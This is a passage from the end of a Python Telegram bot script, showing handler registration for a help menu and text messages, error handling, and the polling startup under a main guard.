    app.add_handler(CallbackQueryHandler(help_menu_cb, pattern="^help_menu$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_error_handler(error_handler)
    logger.info("🤖 Polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True, poll_interval=1.0, timeout=30)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: logger.info("Stopped")
    except Exception as e: logger.error(f"Fatal: {e}\n{traceback.format_exc()}"); sys.exit(1)